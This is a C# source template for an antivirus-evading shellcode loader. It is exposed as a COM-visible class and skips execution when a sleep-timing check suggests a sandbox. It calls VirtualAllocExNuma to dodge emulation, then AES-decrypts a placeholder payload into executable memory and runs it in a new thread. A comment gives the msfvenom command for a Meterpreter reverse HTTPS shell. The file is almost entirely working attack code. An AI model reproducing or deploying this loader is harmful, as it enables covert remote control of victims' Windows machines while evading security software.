using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

[ComVisible(true)]
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("kernel32.dll")]
    static extern void Sleep(uint dwMilliseconds);

    public TestClass()
    {
        DateTime t1 = DateTime.Now;
        Sleep(2000);
        double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
        if (t2 < 1.5)
        {
            return;
        }

        // VirtualAllocExNuma is non emulated api in some antivirus
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);

        if (mem == null)
        {
            Console.WriteLine("no addr");
            Console.ReadLine();
            return;
        }
        // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f csharp
        // Encrypt using AES
        byte[] enc_sh = System.Convert.FromBase64String("{{b64_aes_shellcode}}");
        byte[] KEY = Encoding.ASCII.GetBytes(PaddingString("{{aes_key}}")); // 16 Bytes
        byte[] IV = Encoding.ASCII.GetBytes(PaddingString("{{aes_iv}}"));  // 16 Bytes
        byte[] buf = AesDecrypt(enc_sh, KEY, IV);
        int size = buf.Length;
        // Console.WriteLine(Encoding.UTF8.GetString(buf));
        // Console.ReadLine();
        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

        Marshal.Copy(buf, 0, addr, size);

        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
    public static String PaddingString(String _Input)
    {
        return _Input.PadRight(16, '\0');
    }

    private static byte[] AesDecrypt(byte[] _Data, byte[] _Key, byte[] _IV)
    {
        Aes aesAlg = Aes.Create();
        aesAlg.KeySize = 128;
        aesAlg.BlockSize = 128;
        aesAlg.Padding = System.Security.Cryptography.PaddingMode.Zeros;

        aesAlg.Key = _Key;
        aesAlg.IV = _IV;

        Array.Clear(aesAlg.IV, 0, aesAlg.IV.Length);
        ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
        byte[] unencryptedData = decryptor.TransformFinalBlock(_Data, 0, _Data.Length);
        return unencryptedData;
    }
}